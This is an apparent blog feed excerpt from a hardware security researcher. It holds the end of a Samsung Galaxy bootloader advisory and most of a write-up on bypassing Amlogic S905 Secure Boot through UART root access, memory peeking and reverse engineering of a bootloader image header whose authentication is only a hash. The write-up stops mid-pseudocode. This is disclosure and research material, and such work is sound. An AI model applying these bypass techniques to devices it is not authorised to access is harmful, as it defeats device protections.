&lt;p&gt;On October 21st 2015, mobile forensics company &lt;a href="https://www.cellebrite.com/"&gt;Cellebrite&lt;/a&gt; published a video that demonstrates how their solution can dump eMMC of Samsung Galaxy devices :&lt;/p&gt;
&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/ZsGBbswJGi4?rel=0" frameborder="0" gesture="media" allow="encrypted-media" allowfullscreen&gt;&lt;/iframe&gt;

&lt;p&gt;This video strongly suggests that Samsung Galaxy bootloader can be exploited to execute arbitrary code.&lt;/p&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;Several bugs in Samsung Galaxy bootloader allow an attacker with physical access to execute arbitrary code. Protections like OS lock screen and reactivation lock can be defeated.&lt;/p&gt;
&lt;p&gt;Download mode (a.k.a. ODIN) doesn't properly sanitize headers of flashed images. This can lead to integer &amp;amp; buffer overflows.&lt;/p&gt;
&lt;p&gt;Bugs and exploitation technique are detailed in the &lt;a href="https://www.sstic.org/media/SSTIC2017/SSTIC-actes/attacking_samsung_secure_boot/SSTIC2017-Article-attacking_samsung_secure_boot-basse.pdf"&gt;paper released at SSTIC 2017 conference&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;Proof-of-Concept&lt;/h1&gt;
&lt;p&gt;PoC code for Samsung Galaxy S5 has been &lt;a href="https://github.com/frederic/SVE-2016-7930"&gt;released on GitHub&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;CVSS Version 3 Metrics&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Attack Vector (AV): Physical (P)&lt;/li&gt;
&lt;li&gt;Attack Complexity (AC): Low (L)&lt;/li&gt;
&lt;li&gt;Privileges Required (PR): None (N)&lt;/li&gt;
&lt;li&gt;User Interaction (UI): None (N)&lt;/li&gt;
&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"&gt;Overall CVSS Score: 6.8&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Solution&lt;/h1&gt;
&lt;p&gt;Samsung has released a fix via OTA.&lt;/p&gt;
&lt;h1&gt;Disclosure Timeline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;2016-12-20 Disclosed to Samsung&lt;/li&gt;
&lt;li&gt;2017-03-07 Public disclosure in Samsung Bulletin &lt;a href="https://security.samsungmobile.com/securityUpdate.smsb"&gt;SMR-MAR-2017&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2017-06-08 Talk at &lt;a href="https://www.sstic.org/2017/presentation/attacking_samsung_secure_boot/"&gt;SSTIC 2017 conference&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;2017-07-21 &lt;a href="https://github.com/frederic/SVE-2016-7930"&gt;Proof-of-Concept released&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="vulnerability"></category><category term="advisory"></category><category term="samsung"></category><category term="cellebrite"></category><category term="bootloader"></category><category term="exploit"></category><category term="firmware"></category><category term="security"></category><category term="usb"></category><category term="arm"></category><category term="odin"></category></entry><entry><title>Amlogic S905 SoC: bypassing the (not so) Secure Boot to dump the BootROM</title><link href="https://fredericb.info/2016/10/amlogic-s905-soc-bypassing-not-so.html" rel="alternate"></link><published>2016-10-05T00:00:00-07:00</published><updated>2016-10-05T00:00:00-07:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2016-10-05:/2016/10/amlogic-s905-soc-bypassing-not-so.html</id><summary type="html">&lt;p&gt;The &lt;a href=
"http://www.amlogic.com/#Products/176/index.html"&gt;Amlogic S905
System-On-Chip&lt;/a&gt; is an ARM processor designed for video
applications. It's widely used in Android/Kodi media boxes. The SoC
implements the TrustZone security extensions to run a Trusted
Execution Environment (TEE) that enables DRM &amp;amp; other security
features :&lt;br&gt;
&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="S905 block diagram" src="https://fredericb.info/blog/amlogic-sb/S905_arch.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;Amlogic S905
System Block Diagram&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
The SoC contains a Secure …&lt;/p&gt;</summary><content type="html">&lt;p&gt;The &lt;a href=
"http://www.amlogic.com/#Products/176/index.html"&gt;Amlogic S905
System-On-Chip&lt;/a&gt; is an ARM processor designed for video
applications. It's widely used in Android/Kodi media boxes. The SoC
implements the TrustZone security extensions to run a Trusted
Execution Environment (TEE) that enables DRM &amp;amp; other security
features :&lt;br&gt;
&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="S905 block diagram" src="https://fredericb.info/blog/amlogic-sb/S905_arch.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;Amlogic S905
System Block Diagram&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
The SoC contains a Secure Boot mechanism to authenticate the TEE
image before loading it in TrustZone. And the first link of this
Secure Boot chain is the BootROM code, stored directly in the
chip.&lt;br&gt;
&lt;span style="background-color: red;"&gt;&lt;br&gt;&lt;/span&gt;This articles
describes how to extract the BootROM code from this SoC in the
Android-based&amp;nbsp;&lt;a href="http://www.inphic.com/"&gt;Inphic Spot i7
device&lt;/a&gt;.&lt;br&gt;
&lt;h2&gt;Technical documentation&lt;/h2&gt;
Amlogic released a public version of the S905 datasheet thanks to
&lt;a href=
"http://www.hardkernel.com/main/products/prdt_info.php?g_code=G145457216438&amp;amp;tab_idx=2"&gt;
Hardkernel&lt;/a&gt;. However, it's heavily redacted, and most parts
regarding the Secure Boot or the TrustZone have been removed. But
we can still find a lot of technical information in GPL source code
packages released by &lt;a href=
"http://openlinux.amlogic.com:8000/download/ARM/"&gt;Amlogic&lt;/a&gt; &amp;amp;
&lt;a href=
"https://github.com/150balbes/Amlogic_s905-kernel"&gt;OEMs&lt;/a&gt;.&lt;br&gt;
For example, we can find a potential address for the BootROM
code:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define ROMBOOT_START   0xD9040000&lt;/span&gt;
&lt;span class="cp"&gt;#define ROM_SIZE        (64 * 1024)&lt;/span&gt;
&lt;span class="cp"&gt;#define ROMBOOT_END     (ROMBOOT_START + ROM_SIZE)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Root access over the UART&lt;/h2&gt;

&lt;p&gt;We start by connecting the serial port (or UART) because this
interface could provide a quick &amp;amp; easy access to debug messages &amp;amp;
serial console on bootloaders and Linux kernel.&lt;br&gt;
&lt;a href=
"http://www.devttys0.com/2012/11/reverse-engineering-serial-ports/"&gt;
Identifying the serial port&lt;/a&gt;&amp;nbsp;on this board is quite simple
since there is a port header with labels for the pinout:&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="UART" src="https://fredericb.info/blog/amlogic-sb/uart_header.jpg"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;UART on Inphic
Spot i7 board&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
We connect an USB to UART adapter to this port. Once the Linux
kernel boot process is finished, we have directly access to a root
shell.&lt;br&gt;
We can start to explore the (Non-Secure side of the)
system.&amp;nbsp;For example, we can dump the partitions :&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@p200:/# ls -l /dev/block/platform/d0074000.emmc/
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 boot -&amp;gt; /dev/block/boot
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 bootloader -&amp;gt; /dev/block/bootloader
drwxr-xr-x root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 by-num
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 cache -&amp;gt; /dev/block/cache
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 crypt -&amp;gt; /dev/block/crypt
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 data -&amp;gt; /dev/block/data
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 env -&amp;gt; /dev/block/env
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 instaboot -&amp;gt; /dev/block/instaboot
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 logo -&amp;gt; /dev/block/logo
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 misc -&amp;gt; /dev/block/misc
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 mmcblk0 -&amp;gt; /dev/block/mmcblk0
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 mmcblk0boot0 -&amp;gt; /dev/block/mmcblk0boot0
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 mmcblk0boot1 -&amp;gt; /dev/block/mmcblk0boot1
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 mmcblk0rpmb -&amp;gt; /dev/block/mmcblk0rpmb
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 recovery -&amp;gt; /dev/block/recovery
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 reserved -&amp;gt; /dev/block/reserved
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 rsv -&amp;gt; /dev/block/rsv
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 system -&amp;gt; /dev/block/system
lrwxrwxrwx root     root              &lt;span class="m"&gt;2015&lt;/span&gt;-01-01 &lt;span class="m"&gt;00&lt;/span&gt;:00 tee -&amp;gt; /dev/block/tee
&lt;/pre&gt;&lt;/div&gt;


&lt;div&gt;While the&amp;nbsp;&lt;i&gt;tee&lt;/i&gt; partition (Trusted Execution
Environment) turns out to be empty, the &lt;i&gt;bootloader&lt;/i&gt; partition
contains several bootloaders. But not the BootROM&amp;nbsp;because it's
stored in the SoC, not the flash.&lt;/div&gt;

&lt;h2&gt;(Fail at) Reading the BootROM&lt;/h2&gt;

&lt;p&gt;Since we have root permissions and a potential memory address for
the BootROM, we can try to read it directly. The provided Android
ROM contains a handy debugfs interface to peek &amp;amp; poke physical
memory from user-land:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@p200:/# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;d0070000&amp;quot;&lt;/span&gt; &amp;gt;/sys/kernel/debug/aml_reg/paddr               
root@p200:/# cat /sys/kernel/debug/aml_reg/paddr                             
&lt;span class="o"&gt;[&lt;/span&gt;0xd0070000&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0x1000254
&lt;/pre&gt;&lt;/div&gt;


&lt;div&gt;This &lt;i&gt;aml_reg&lt;/i&gt; driver uses the &lt;i&gt;ioremap&lt;/i&gt; kernel
function to set up an appropriate kernel page-table mapping for the
requested address.&lt;/div&gt;

&lt;div&gt;&lt;br&gt;&lt;/div&gt;

&lt;div&gt;However, if we try to read the
hypothetical&amp;nbsp;BootROM&amp;nbsp;area:&lt;/div&gt;

&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@p200:/# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;d9040000&amp;quot;&lt;/span&gt; &amp;gt;/sys/kernel/debug/aml_reg/paddr
root@p200:/# cat /sys/kernel/debug/aml_reg/paddr
&lt;span class="o"&gt;[&lt;/span&gt;  &lt;span class="m"&gt;376&lt;/span&gt;.546491@0&lt;span class="o"&gt;]&lt;/span&gt; Unhandled fault: synchronous external abort &lt;span class="o"&gt;(&lt;/span&gt;0x96000010&lt;span class="o"&gt;)&lt;/span&gt; at 0xffffff80001aa000
&lt;span class="o"&gt;[&lt;/span&gt;  &lt;span class="m"&gt;376&lt;/span&gt;.549396@0&lt;span class="o"&gt;]&lt;/span&gt; Internal error: : &lt;span class="m"&gt;96000010&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="c1"&gt;#1] PREEMPT SMP&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;  &lt;span class="m"&gt;376&lt;/span&gt;.554712@0&lt;span class="o"&gt;]&lt;/span&gt; Modules linked in: dwc_otg dhd&lt;span class="o"&gt;(&lt;/span&gt;O&lt;span class="o"&gt;)&lt;/span&gt; aml_thermal&lt;span class="o"&gt;(&lt;/span&gt;O&lt;span class="o"&gt;)&lt;/span&gt; mali&lt;span class="o"&gt;(&lt;/span&gt;O&lt;span class="o"&gt;)&lt;/span&gt; aml_nftl_dev&lt;span class="o"&gt;(&lt;/span&gt;PO&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&amp;nbsp;
&lt;div&gt;The kernel crashes. So either the&amp;nbsp;BootROM&amp;nbsp;address is
wrong or this memory area is set as &lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.prd29-genc-009492c/ch03s03s02.html"&gt;
secure&lt;/a&gt;.&lt;/div&gt;
&lt;div&gt;Since we don't have other candidates for
the&amp;nbsp;BootROM&amp;nbsp;address, let's say the&amp;nbsp;BootROM&amp;nbsp;area
is not accessible from&amp;nbsp;the&amp;nbsp;Non-Secure World.&lt;/div&gt;
&lt;h2&gt;Enter the Secure World&lt;/h2&gt;
&lt;div&gt;In theory, the Secure Boot chain prevents loading unauthorized
code in the Secure World.&lt;br&gt;
A quick inspection of debug logs from the UART during the early
phases of boot indicates that the bootloaders are based on
the&amp;nbsp;&lt;a href=
"https://github.com/ARM-software/arm-trusted-firmware"&gt;ARM Trusted
Firmware (ATF)&lt;/a&gt; reference implementation.&lt;/div&gt;
&lt;div&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="ARM Trusted Firmware Design" src="https://fredericb.info/blog/amlogic-sb/securebootflow.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;ARM Trusted
Firmware Design&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
We will now explore some ways to get access to Secure World.&lt;br&gt;
&lt;h2&gt;U-Boot bootloader&lt;/h2&gt;
Using the console over UART, we can interrupt the U-Boot boot
sequence to access to the prompt. From here we can run arbitrary
U-boot commands:&lt;br&gt;
&lt;blockquote class="tr_bq"&gt;Hit any key to stop autoboot: 0&lt;br&gt;
gxb_p200_v1#help&lt;br&gt;
? &amp;nbsp; &amp;nbsp; &amp;nbsp; - alias for 'help'&lt;br&gt;
aml_sysrecovery- Burning with amlogic format package from partition
sysrecovery&lt;br&gt;
amlmmc &amp;nbsp;- AMLMMC sub system&lt;br&gt;
amlnf &amp;nbsp; - aml nand sub-system&lt;br&gt;
amlnf_test- AMLPHYNAND sub-system&lt;br&gt;
autoping- do auto ping test&lt;br&gt;
autoscr - run script from memory&lt;/blockquote&gt;
However the U-Boot bootloader (named BL33 in the ATF design) runs
in Non-Secure mode as we can see in boot logs from the UART
console:&lt;/div&gt;
&lt;div&gt;
&lt;blockquote&gt;INFO: &amp;nbsp; &amp;nbsp;BL3-1: Preparing for EL3 exit to
normal world&lt;br&gt;
INFO: &amp;nbsp; &amp;nbsp;BL3-1: Next image address = 0x1000000&lt;br&gt;
INFO: &amp;nbsp; &amp;nbsp;BL3-1: Next image spsr = 0x3c9&lt;br&gt;
&lt;br&gt;
U-Boot 2015.01-ga9e9562-dirty (May 06 2016 - 03:36:02)&lt;/blockquote&gt;
So at this point we are already locked out of the Secure World.
Next.&lt;br&gt;
&lt;h2&gt;SMC interface&lt;/h2&gt;
Secure &amp;amp; Non-Secure Worlds can communicate through the ARM Secure
Monitor Call (SMC). When a core executes the SMC instruction, it
switches to Secure Monitor mode (exception level EL3).&lt;/div&gt;
&lt;div&gt;In the ATF design, the code that runs in EL3 is named the Boot
Loader stage 3-1 (BL31). We can find this image in the
&lt;i&gt;bootloader&lt;/i&gt; partition we've dumped previously. This code is
highly critical for TrustZone security so we should explore it.&lt;br&gt;
&lt;br&gt;
The open-source ATF code base in the BL31 image facilitates the
analysis by reverse engineering, since we can quickly recover the
ATF code structure.&lt;br&gt;
Here is the list of registered services that handle SMC interrupts
from Normal World:&lt;br&gt;
&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/amlogic-sb/rt_svc_descs.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;Registered
services in BL31 image&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
The &lt;i&gt;sip_svc&lt;/i&gt; service&amp;nbsp;is interesting because it contains
several custom functions developed by Amlogic:&lt;br&gt;
&lt;br&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/amlogic-sb/sip_svc_plat_ops.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;List of handlers
in the SIP service&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
At first glance, functions&amp;nbsp;&lt;i&gt;hdcp22_sec_read_reg&lt;/i&gt;
&amp;amp;&amp;nbsp;&lt;i&gt;hdcp22_sec_write_reg&lt;/i&gt; look promising because they
are read &amp;amp; write primitives for the secure memory. However, they
strictly restrict access to specific memory ranges:&lt;br&gt;
&lt;div class="separator" style="clear: both; text-align: center;"&gt;
&lt;/div&gt;
&lt;table align="center" cellpadding="0" cellspacing="0" class=
"tr-caption-container" style=
"margin-left: auto; margin-right: auto; text-align: center;"&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style="text-align: center;"&gt;
&lt;img alt="" src="https://fredericb.info/blog/amlogic-sb/hdcp22_sec_read_reg.png"&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td class="tr-caption" style="text-align: center;"&gt;
Function&amp;nbsp;hdcp22_sec_read_reg decompiled&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
A quick (incomplete) analysis of other functions didn't reveal any
trivial flaw in parameters sanitization (arbitrary read/write
bugs). Some of them are quite complex, especially the cryptographic
functions, so they have not been inspected at all.&lt;br&gt;
&lt;br&gt;
We may be able to trigger Secure World memory corruption from the
Normal World&amp;nbsp;if &lt;a href=
"http://www.fredericb.info/2014/12/qpsiir-80-qualcomm-trustzone-integer.html"&gt;
we find bugs&lt;/a&gt;&amp;nbsp;in one of these functions, and then achieve
privilege escalation to Secure World. However that would require
some expert skills to &lt;a href=
"http://bits-please.blogspot.fr/2016/05/qsee-privilege-escalation-vulnerability.html"&gt;
actually exploit them&lt;/a&gt;. So let's explore another attack
vector.&lt;br&gt;
&lt;h2&gt;Bypass the Secure Boot chain&lt;/h2&gt;
&lt;/div&gt;
&lt;div&gt;Another solution to get access to the Secure World is to
break/bypass/fool/kindly ask the Secure Boot chain at one of its
stage. A common attack surface of a Secure Boot chain is the
loading, parsing and authentication steps of the next stage.&lt;/div&gt;
&lt;div&gt;&lt;br&gt;&lt;/div&gt;
&lt;div&gt;We don't have access to BL1 code (yet!) since it's stored in
the SoC. But we have the BL2 image from
the&amp;nbsp;&lt;i&gt;bootloader&lt;/i&gt;&amp;nbsp;partition we have dumped
previously. So we will analyze the mechanism used by BL2 to parse
and authenticate the BL31 image in the hope of finding interesting
flaws.&lt;br&gt;
&lt;br&gt;
Here start the lengthy process of reverse engineering a binary
without any syscall and very few strings to guide our efforts.
Fortunately, the BL2 image is quite small: ~40KB. And we have some
ideas to save time:&lt;/div&gt;
&lt;div&gt;&lt;span style="background-color: red;"&gt;&lt;br&gt;&lt;/span&gt;Like BL31, the
BL2 image follows the ATF code logic, so reverse engineering
efforts are a bit simplified: we can quickly spot main functions &amp;amp;
structures defined in the ATF code base.&lt;/div&gt;
&lt;div&gt;&lt;br&gt;&lt;/div&gt;
&lt;div&gt;Another RE trick is to identify the memory-mapped devices
accessed by functions to deduce their role.&lt;/div&gt;
&lt;div&gt;Several address ranges of these memory areas can be found in
the SoC datasheet and the &lt;a href=
"https://github.com/150balbes/Amlogic_S905-u-boot/blob/32cbae9c92a0a5b5a5d0f58f8fd3ca31d1f9ce66/arch/arm/include/asm/arch-gxb/secure_apb.h"&gt;
GPL source code&lt;/a&gt;. For example, we can expect that cryptographic
functions access memory registers dedicated to the hardware
cryptographic engine.&lt;br&gt;
&lt;br&gt;
Finally, we don't want to spend time reversing open source code,
especially cryptographic code because the task is quite hard. And
since it's also complex from the developer perspective, we can
expect they used a library, which may be open source. So we looked
for similarities in function prototypes, call sequence &amp;amp;
initialization of context structures between BL2 code and few
potential OSS libraries. In our case, we quickly figured out that
the&amp;nbsp;cryptographic&amp;nbsp;code comes from the &lt;a href=
"https://tls.mbed.org/"&gt;OSS PolarSSL/mbed TLS project&lt;/a&gt;.&lt;br&gt;
&lt;div&gt;&lt;br&gt;&lt;/div&gt;
&lt;h3&gt;Analyzing BL2 authentication routine&lt;/h3&gt;
Once BL2 has loaded the BL3 image from the NAND, the header is
parsed. We don't have any information on the header structure yet
(not present in the ATF code), but we can notice it starts with a
constant &lt;i&gt;magic&lt;/i&gt; value "&lt;b&gt;@AML&lt;/b&gt;". This helps to quickly
locate the parsing code in the BL2 binary.&lt;br&gt;
We combine "guessing" (i.e. looking at the BL31 header in a hex
editor) and reverse engineering of the BL2 parsing code to figure
out some members of the header structure:&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;aml_img_header&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;magic&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;&lt;span class="c1"&gt;// &amp;quot;@AML&amp;quot;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;total_len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="n"&gt;header_len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="n"&gt;unk_x9&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="n"&gt;unk_xA&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="n"&gt;unk_xB&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;unk_xC&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;sig_type&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;sig_offset&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;sig_size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;data_offset&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;unk_x20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;cert_offset&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;cert_size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;data_len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;unk_x30&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;code_offset&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;code_len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;uint32_t&lt;/span&gt; &lt;span class="n"&gt;unk_x3C&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;aml_img_header_t&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The header indicates that the image is split in 4 parts:&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;header : always 64 bytes&lt;/li&gt;
&lt;li&gt;signature : RSA-1024, RSA-2048, RSA-4096 or SHA-256&lt;/li&gt;
&lt;li&gt;cert : x509 certificate&lt;/li&gt;
&lt;li&gt;code: payload&lt;/li&gt;
&lt;/ul&gt;
On our target device, the signature type of the BL31 image
(&lt;i&gt;sig_type&lt;/i&gt; in the header) is SHA-256. This is intriguing
because a SHA-256 hash alone is not enough to provide
authentication.&lt;br&gt;
The following pseudocode is the simplified algorithm of the
authentication routine in BL2 :&lt;br&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;auth_image&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;aml_img_header_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
  &lt;span class="n"&gt;validate_header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// checks on magic value &amp;amp; header length&lt;/span&gt;
